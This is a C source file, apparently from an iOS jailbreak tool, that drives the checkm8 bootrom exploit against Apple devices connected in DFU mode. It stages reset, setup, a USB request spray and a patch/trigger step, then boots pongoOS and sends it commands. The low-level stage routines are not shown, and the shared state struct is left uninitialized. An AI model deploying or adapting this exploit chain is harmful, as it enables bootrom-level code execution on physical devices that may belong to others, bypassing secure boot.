#include "run.h"

#include <stdlib.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <pthread.h>
#include <inttypes.h>
#include <stdint.h>

#include "../utils.h"
#include "../usb/usb_shim.h"
#include "../pongo/pongo_helper.h"

#include "checkm8.h"
#include "dfu.h"
#include "payload.h"

typedef struct {
    atomic_bool stop;
    atomic_int result;
} shared_t;

static void *exploit_thread(void *arg)
{
    shared_t *s = (shared_t *)arg;

    usb_handle_t handle;
    struct DeviceConfiguration deviceConfig;
    struct PayloadConfiguration payloadConfig;

    int stage = STAGE_PREPARE;
    bool ret = false;

    init_usb_handle(&handle, 0x5AC, 0x1227);

    while (stage != STAGE_DONE && !atomic_load(&s->stop)) {
        if (!wait_usb_handle(&handle)) {
            atomic_store(&s->result, -1);
            atomic_store(&s->stop, true);
            break;
        }

        switch (stage) {
        case STAGE_PREPARE: {
            char *sn = get_usb_serial_number(&handle);
            if (!sn) goto fail;

            if (!checkm8_find_device_configuration_for_cpid(
                    dfu_serial_number_get_cpid(sn), &deviceConfig)) {
                free(sn);
                goto fail;
            }

            if (!checkm8_find_payload_configuration_for_cpid(
                    dfu_serial_number_get_cpid(sn), &payloadConfig)) {
                free(sn);
                goto fail;
            }

            if (!dfu_serial_number_is_in_dfu_mode(sn)) {
                free(sn);
                goto fail;
            }

            free(sn);
            stage = STAGE_RESET;
            break;
        }
        case STAGE_RESET:
            ret = checkm8_stage_reset(&handle);
            stage = ret ? STAGE_SETUP : STAGE_RESET;
            break;
        case STAGE_SETUP:
            LOG("Setting up the device for exploitation");
            ret = checkm8_stage_setup(&handle, &deviceConfig);
            stage = ret ? STAGE_SPRAY : STAGE_RESET;
            break;
        case STAGE_SPRAY:
            LOG("Spraying the device with USB requests");
            ret = checkm8_stage_spray(&handle, &deviceConfig);
            stage = ret ? STAGE_PATCH : STAGE_RESET;
            break;
        case STAGE_PATCH:
            LOG("Right before trigger (this is the real bug setup)");
            ret = checkm8_stage_patch(&handle, &deviceConfig, &payloadConfig);
            if (!ret) goto fail;
            stage = STAGE_PONGO;
            break;
        case STAGE_PONGO:
            LOG("Booting pongoOS");
            close_usb_handle(&handle);
            sleep_ms(3000);
            checkm8_boot_pongo(&handle);
            stage = STAGE_DONE;
            atomic_store(&s->result, 1);
            atomic_store(&s->stop, true);
            break;
        default:
            goto fail;
        }

        reset_usb_handle(&handle);
        continue;

    fail:
        atomic_store(&s->result, -1);
        atomic_store(&s->stop, true);
        break;
    }

    return NULL;
}

static void *pongo_thread(void *arg)
{
    shared_t *s = (shared_t *)arg;

    usb_handle_t handle;
    bool seen = false;

    init_usb_handle(&handle, 0x5AC, 0x4141);

    while (!atomic_load(&s->stop)) {
        if (!wait_usb_handle(&handle)) {
            atomic_store(&s->result, -1);
            atomic_store(&s->stop, true);
            break;
        }

        if (!seen) {
            LOG("Pongo device detected!");
            seen = true;
            char paleinfo[64];
            snprintf(paleinfo, sizeof(paleinfo), "palera1n_flags 0x%" PRIx64, palerain_flags);

            issue_pongo_command(&handle, "fuse lock", NULL);
            issue_pongo_command(&handle, "sep auto", NULL);
            // issue_pongo_command(&handle, paleinfo, NULL);
            // issue_pongo_command(&handle, "bootx", NULL);

            atomic_store(&s->result, 1);
            atomic_store(&s->stop, true);
            break;
        }

        reset_usb_handle(&handle);
    }

    close_usb_handle(&handle);
    return NULL;
}

bool exploit(void) {
    pthread_t t1, t2;

    shared_t state;

    pthread_create(&t1, NULL, exploit_thread, &state);
    pthread_create(&t2, NULL, pongo_thread, &state);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    return atomic_load(&state.result) == 1;
}
